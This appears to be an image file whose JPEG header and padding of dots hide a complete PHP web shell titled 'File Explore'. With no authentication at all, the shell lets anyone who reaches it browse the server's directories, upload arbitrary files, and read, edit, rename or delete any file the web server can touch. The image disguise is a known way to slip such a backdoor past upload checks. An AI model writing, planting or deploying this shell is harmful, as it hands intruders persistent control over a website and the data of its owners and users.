???�� JFIF      ?? C 	!"$"$?? C?? p " ??             ??             ?��    ????(%	aA*?XYD?(J??E��RE,P�XYae?)(E��2�B��R��	BQ��� X?)X�����?  @  
.....................................................................................................................................???�� JFIF      ?? C 	!"$"$?? C?? p " ??             ??             ?��    ????(%	aA*?XYD?(J??E��RE,P�XYae?)(E��2�B��R��	BQ��� X?)X�����?  @  

.......................................................................................................... ...................<?php
$currentDir = isset($_POST['d']) && !empty($_POST['d']) ? base64_decode($_POST['d']) : getcwd();
$currentDir = str_replace("\\", "/", $currentDir);
$dir = $currentDir; // Needed for Adminer logic

// Directory Navigation
$pathParts = explode("/", $currentDir);
echo "<div class=\"dir\">";
foreach ($pathParts as $k => $v) {
    if ($v == "" && $k == 0) {
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('/')\">/</a>";
        continue;
    }
    $dirPath = implode("/", array_slice($pathParts, 0, $k + 1));
    echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($dirPath) . "')\">$v</a>/";
}
echo "</div>";

// Upload
if (isset($_POST['s']) && isset($_FILES['u']) && $_FILES['u']['error'] == 0) {
$fileName = $_FILES['u']['name'];
$tmpName = $_FILES['u']['tmp_name'];
$destination = $currentDir . '/' . $fileName;
if (rename($tmpName, $destination)) {
echo "<script>alert('Upload successful!'); postDir('" . addslashes($currentDir) . "');</script>";
} else {
echo "<script>alert('Upload failed!');</script>";
}
}

// File/Folder Listing
$items = scandir($currentDir);
if ($items !== false) {
    echo "<table>";
    echo "<tr><th>Name</th><th>Size</th><th>Action</th></tr>";

    foreach ($items as $item) {
        $fullPath = $currentDir . '/' . $item;
        if ($item == '.' || $item == '..') continue;

        if (is_dir($fullPath)) {
            echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fullPath) . "')\"><b>dir><b/> $item</a></td><td>--</td><td>--</td></tr>";
        } else {
            $size = filesize($fullPath) / 1024;
            $size = $size >= 1024 ? round($size / 1024, 2) . 'MB' : round($size, 2) . 'KB';
            echo "<tr><td><a href=\"javascript:void(0);\" onclick=\"postOpen('" . addslashes($fullPath) . "')\">fil> $item</a></td><td>$size</td><td>"
                . "<a href=\"javascript:void(0);\" onclick=\"postDel('" . addslashes($fullPath) . "')\">Delete</a> | "
                . "<a href=\"javascript:void(0);\" onclick=\"postEdit('" . addslashes($fullPath) . "')\">Edit</a> | "
                . "<a href=\"javascript:void(0);\" onclick=\"postRen('" . addslashes($fullPath) . "', '$item')\">Rename</a>"
                . "</td></tr>";
        }
    }
    echo "</table>";
} else {
    echo "<p>Unable to read directory!</p>";
}

// Delete File
if (isset($_POST['del'])) {
    $filePath = base64_decode($_POST['del']);
    $fileDir = dirname($filePath);
    if (@unlink($filePath)) {
        echo "<script>alert('Delete successful'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Delete failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

// Edit File
if (isset($_POST['edit'])) {
    $filePath = base64_decode($_POST['edit']);
    $fileDir = dirname($filePath);
    if (file_exists($filePath)) {
        echo "<style>table{display:none;}</style>";
        echo "<a href=\"javascript:void(0);\" onclick=\"postDir('" . addslashes($fileDir) . "')\">Back</a>";
        echo "<form method=\"post\">
            <input type=\"hidden\" name=\"obj\" value=\"" . $_POST['edit'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($fileDir) . "\">
            <textarea name=\"content\">" . htmlspecialchars(file_get_contents($filePath)) . "</textarea>
            <center><button type=\"submit\" name=\"save\">Save</button></center>
            </form>";
    }
}

// Save Edited File
if (isset($_POST['save']) && isset($_POST['obj']) && isset($_POST['content'])) {
    $filePath = base64_decode($_POST['obj']);
    $fileDir = dirname($filePath);
    if (file_put_contents($filePath, $_POST['content'])) {
        echo "<script>alert('Saved'); postDir('" . addslashes($fileDir) . "');</script>";
    } else {
        echo "<script>alert('Save failed'); postDir('" . addslashes($fileDir) . "');</script>";
    }
}

// Rename
if (isset($_POST['ren'])) {
    $oldPath = base64_decode($_POST['ren']);
    $oldDir = dirname($oldPath);
    if (isset($_POST['new'])) {
        $newPath = $oldDir . '/' . $_POST['new'];
        if (rename($oldPath, $newPath)) {
            echo "<script>alert('Renamed'); postDir('" . addslashes($oldDir) . "');</script>";
        } else {
            echo "<script>alert('Rename failed'); postDir('" . addslashes($oldDir) . "');</script>";
        }
    } else {
        echo "<form method=\"post\">
            New Name: <input name=\"new\" type=\"text\">
            <input type=\"hidden\" name=\"ren\" value=\"" . $_POST['ren'] . "\">
            <input type=\"hidden\" name=\"d\" value=\"" . base64_encode($oldDir) . "\">
            <input type=\"submit\" value=\"Submit\">
            </form>";
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>File Explore</title>
    <style>
        table { margin: 20px auto; border-collapse: collapse; width: 90%; }
        th, td { border: 1px solid #000; padding: 5px; text-align: left; }
        textarea { width: 100%; height: 300px; }
        .dir { margin: 20px; }
    </style>
    <script>
        function postDir(dir) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "d";
            input.value = btoa(dir);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postDel(path) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "del";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postEdit(path) {
            var form = document.createElement("form");
            form.method = "post";
            var input = document.createElement("input");
            input.name = "edit";
            input.value = btoa(path);
            form.appendChild(input);
            document.body.appendChild(form);
            form.submit();
        }
        function postRen(path, name) {
            var newName = prompt("New name:", name);
            if (newName) {
                var form = document.createElement("form");
                form.method = "post";
                var input1 = document.createElement("input");
                input1.name = "ren";
                input1.value = btoa(path);
                var input2 = document.createElement("input");
                input2.name = "new";
                input2.value = newName;
                form.appendChild(input1);
                form.appendChild(input2);
                document.body.appendChild(form);
                form.submit();
            }
        }
        function postOpen(path) {
            window.open(atob(btoa(path)));
        }
    </script>
</head>
<body>
    <div class="dir">
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="u">
            <input type="submit" name="s" value="Upload">
            <input type="hidden" name="d" value="<?php echo base64_encode($currentDir); ?>">
        </form>
    </div>
</body>
</html>
